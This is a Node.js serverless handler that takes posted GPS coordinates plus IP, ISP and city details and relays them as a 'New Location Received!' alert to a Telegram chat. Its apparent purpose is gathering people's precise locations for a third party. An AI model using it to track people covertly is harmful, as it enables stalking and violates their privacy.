const fetch = require('node-fetch');
const FormData = require('form-data');
const formidable = require('formidable');

module.exports = async (req, res) => {
  const botToken = process.env.TOKEN;

  if (!botToken) {
    console.error('Bot token not configured.');
    return res.status(500).json({ ok: false, error: 'Bot token not configured.' });
  }

  if (req.method !== 'POST') {
    console.error('Method not allowed:', req.method);
    return res.status(405).json({ ok: false, error: 'Method not allowed.' });
  }

  const form = new formidable.IncomingForm();
  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error('Error parsing form:', err);
      return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
    }

    const { chat_id, latitude, longitude, accuracy, ip, country, region, city, isp, timezone } = fields;

    if (!chat_id || !latitude || !longitude) {
      console.error('Missing required parameters');
      return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
    }

    try {
      // Send location to Telegram
      const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
      const locationResponse = await fetch(locationUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          chat_id: chat_id,
          latitude: latitude,
          longitude: longitude
        })
      });

      const locationResult = await locationResponse.json();
      if (!locationResult.ok) {
        throw new Error(locationResult.description || 'Failed to send location');
      }

      // Prepare IP info message
      let ipInfoMessage = `📍 <b>New Location Received!</b>\n\n`;
      ipInfoMessage += `🛰 <b>GPS Coordinates:</b>\n`;
      ipInfoMessage += `Latitude: ${latitude}\n`;
      ipInfoMessage += `Longitude: ${longitude}\n`;
      ipInfoMessage += `Accuracy: ${accuracy || 'N/A'} meters\n\n`;

      if (ip) {
        ipInfoMessage += `🌐 <b>Network Information:</b>\n`;
        ipInfoMessage += `IP: ${ip}\n`;
        ipInfoMessage += `Country: ${country}\n`;
        ipInfoMessage += `Region: ${region}\n`;
        ipInfoMessage += `City: ${city}\n`;
        ipInfoMessage += `ISP: ${isp}\n`;
        ipInfoMessage += `Timezone: ${timezone}\n`;
      }

      // Send IP info to Telegram
      const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const messageResponse = await fetch(messageUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          chat_id: chat_id,
          text: ipInfoMessage,
          parse_mode: 'HTML'
        })
      });

      const messageResult = await messageResponse.json();
      if (!messageResult.ok) {
        throw new Error(messageResult.description || 'Failed to send message');
      }

      return res.status(200).json({ ok: true });
    } catch (error) {
      console.error('Error in sendMedia:', error);
      return res.status(500).json({ ok: false, error: error.message });
    }
  });
};
